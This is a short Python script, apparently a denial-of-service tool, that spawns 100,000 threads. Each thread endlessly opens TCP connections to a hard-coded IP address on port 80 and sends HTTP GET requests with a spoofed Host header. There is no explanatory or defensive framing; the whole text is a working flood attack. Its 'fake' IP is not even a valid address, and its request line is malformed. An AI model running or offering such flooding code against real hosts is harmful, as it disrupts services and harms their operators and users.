import threading
import socket

target = '143.204.109.76'
port = 80
fake_ip = '24.266.33.35'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        print(already_connected)

for i in range(100000):
    thread = threading.Thread(target=attack)
    thread.start()